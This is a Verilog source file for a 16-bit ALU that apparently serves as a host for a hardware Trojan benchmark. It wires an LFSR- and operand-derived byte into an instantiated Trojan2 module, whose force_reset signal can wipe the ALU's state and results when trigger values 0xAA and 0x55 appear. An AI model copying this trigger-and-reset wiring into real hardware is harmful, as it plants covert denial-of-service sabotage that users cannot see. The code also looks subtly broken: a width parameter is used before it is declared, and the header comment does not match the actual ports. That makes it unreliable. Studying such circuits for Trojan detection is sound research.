// ALU Host Circuit for Trojan2
// Fixed I/O to match Trojan2: clk, rst, data_in[7:0] -> force_reset
module trojan2_alu_host #(
    parameter [19:0] ALU_SEED = 20'hABCDE,  // Seed for data generation
    parameter [7:0] TROJ_TRIGGER_SEQUENCE_1 = 8'hAA,
    parameter [7:0] TROJ_TRIGGER_SEQUENCE_2 = 8'h55
)(
    input wire clk,
    input wire rst,
    input wire [DATA_WIDTH-1:0] operand_a,
    input wire [DATA_WIDTH-1:0] operand_b,
    input wire [3:0] alu_op,
    input wire alu_enable,
    output reg [DATA_WIDTH-1:0] alu_result,
    output reg [3:0] alu_flags,  // [3:zero, 2:carry, 1:overflow, 0:negative]
    output reg result_valid
);

    // Sizing parameters (converted from parameter to localparam)
    localparam DATA_WIDTH = 16;    // ALU operand width

    // Trojan interface (fixed width)
    reg [7:0] trojan_data_in;
    wire trojan_force_reset;
    
    // ALU internal signals
    reg [2*DATA_WIDTH-1:0] temp_result_wide;  // For multiplication
    reg [DATA_WIDTH:0] temp_result;  // For normal operations
    reg [19:0] seed_lfsr;
    reg [2:0] alu_state;
    reg [1:0] data_sel;
    reg temp_carry, temp_overflow, temp_zero, temp_negative;
    reg result_ready;
    
    // Data generation for trojan
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            seed_lfsr <= ALU_SEED;
            data_sel <= 2'b00;
        end else if (alu_enable) begin
            seed_lfsr <= {seed_lfsr[18:0], seed_lfsr[19] ^ seed_lfsr[16] ^ seed_lfsr[13] ^ seed_lfsr[1]};
            data_sel <= data_sel + 1;
        end
    end
    
    // Select data for trojan based on operands
    always @(*) begin
        case (data_sel)
            2'b00: trojan_data_in = seed_lfsr[7:0];
            2'b01: trojan_data_in = seed_lfsr[15:8];
            2'b10: trojan_data_in = seed_lfsr[19:12] ^ operand_a[7:0];
            2'b11: trojan_data_in = seed_lfsr[7:0] ^ operand_b[7:0];
            default: trojan_data_in = 8'h00;
        endcase
    end
    
    // ALU state machine
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            alu_state <= 3'b000;
            temp_result <= {DATA_WIDTH+1{1'b0}};
            temp_result_wide <= {2*DATA_WIDTH{1'b0}};
            result_valid <= 1'b0;
            result_ready <= 1'b0;
        end else if (trojan_force_reset) begin
            // Synchronous reset from trojan
            alu_state <= 3'b000;
            temp_result <= {DATA_WIDTH+1{1'b0}};
            temp_result_wide <= {2*DATA_WIDTH{1'b0}};
            result_valid <= 1'b0;
            result_ready <= 1'b0;
        end else begin
            case (alu_state)
                3'b000: begin // IDLE
                    if (!alu_enable) begin
                        result_valid <= 1'b0;
                        result_ready <= 1'b0;
                    end
                    if (alu_enable && !result_ready) begin
                        alu_state <= 3'b001;
                    end
                end
                3'b001: begin // EXECUTE
                    case (alu_op)
                        4'b0000: begin // ADD
                            temp_result <= {1'b0, operand_a} + {1'b0, operand_b};
                        end
                        4'b0001: begin // SUB
                            temp_result <= {1'b0, operand_a} - {1'b0, operand_b};
                        end
                        4'b0010: begin // AND
                            temp_result <= {1'b0, operand_a & operand_b};
                        end
                        4'b0011: begin // OR
                            temp_result <= {1'b0, operand_a | operand_b};
                        end
                        4'b0100: begin // XOR
                            temp_result <= {1'b0, operand_a ^ operand_b};
                        end
                        4'b0101: begin // NOT
                            temp_result <= {1'b0, ~operand_a};
                        end
                        4'b0110: begin // SHL
                            temp_result <= {operand_a, 1'b0};
                        end
                        4'b0111: begin // SHR
                            temp_result <= {1'b0, operand_a >> 1};
                        end
                        4'b1000: begin // SLT (signed)
                            temp_result <= ($signed(operand_a) < $signed(operand_b)) ? {{DATA_WIDTH{1'b0}}, 1'b1} : {DATA_WIDTH+1{1'b0}};
                        end
                        4'b1001: begin // EQ
                            temp_result <= (operand_a == operand_b) ? {{DATA_WIDTH{1'b0}}, 1'b1} : {DATA_WIDTH+1{1'b0}};
                        end
                        4'b1010: begin // MUL (full width)
                            temp_result_wide <= operand_a * operand_b;
                            temp_result <= operand_a * operand_b;
                        end
                        4'b1011: begin // DIV
                            temp_result <= (operand_b != {DATA_WIDTH{1'b0}}) ? {1'b0, operand_a / operand_b} : {DATA_WIDTH+1{1'b1}};
                        end
                        default: temp_result <= {DATA_WIDTH+1{1'b0}};
                    endcase
                    alu_state <= 3'b010;
                end
                3'b010: begin // RESULT
                    // Calculate flags
                    temp_negative <= temp_result[DATA_WIDTH-1];
                    temp_zero <= (temp_result[DATA_WIDTH-1:0] == {DATA_WIDTH{1'b0}});
                    
                    // Calculate carry and overflow based on operation
                    case (alu_op)
                        4'b0000: begin // ADD
                            temp_carry <= temp_result[DATA_WIDTH];
                            temp_overflow <= (operand_a[DATA_WIDTH-1] == operand_b[DATA_WIDTH-1]) && 
                                           (operand_a[DATA_WIDTH-1] != temp_result[DATA_WIDTH-1]);
                        end
                        4'b0001: begin // SUB
                            temp_carry <= temp_result[DATA_WIDTH];
                            temp_overflow <= (operand_a[DATA_WIDTH-1] != operand_b[DATA_WIDTH-1]) && 
                                           (operand_a[DATA_WIDTH-1] != temp_result[DATA_WIDTH-1]);
                        end
                        4'b0110: begin // SHL
                            temp_carry <= operand_a[DATA_WIDTH-1];
                            temp_overflow <= operand_a[DATA_WIDTH-1] != operand_a[DATA_WIDTH-2];
                        end
                        4'b1010: begin // MUL
                            temp_carry <= (temp_result_wide[2*DATA_WIDTH-1:DATA_WIDTH] != {DATA_WIDTH{1'b0}});
                            temp_overflow <= (temp_result_wide[2*DATA_WIDTH-1:DATA_WIDTH] != {DATA_WIDTH{1'b0}});
                        end
                        default: begin
                            temp_carry <= 1'b0;
                            temp_overflow <= 1'b0;
                        end
                    endcase
                    
                    result_valid <= 1'b1;
                    result_ready <= 1'b1;
                    alu_state <= 3'b000;
                end
                default: alu_state <= 3'b000;
            endcase
        end
    end
    
    // Output result and flags
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            alu_result <= {DATA_WIDTH{1'b0}};
            alu_flags <= 4'b0000;
        end else if (trojan_force_reset) begin
            // Synchronous reset from trojan
            alu_result <= {DATA_WIDTH{1'b0}};
            alu_flags <= 4'b0000;
        end else if (result_valid && result_ready) begin
            alu_result <= temp_result[DATA_WIDTH-1:0];
            // Flags: [3:zero, 2:carry, 1:overflow, 0:negative]
            alu_flags[0] <= temp_negative;   // Negative
            alu_flags[1] <= temp_overflow;   // Overflow
            alu_flags[2] <= temp_carry;      // Carry  
            alu_flags[3] <= temp_zero;       // Zero
        end
    end
    
    // Instantiate Trojan2
    Trojan2 #(
        .TRIGGER_SEQUENCE_1(TROJ_TRIGGER_SEQUENCE_1),
        .TRIGGER_SEQUENCE_2(TROJ_TRIGGER_SEQUENCE_2)
    ) trojan_inst (
        .clk(clk),
        .rst(rst),
        .data_in(trojan_data_in),
        .force_reset(trojan_force_reset)
    );

endmodule

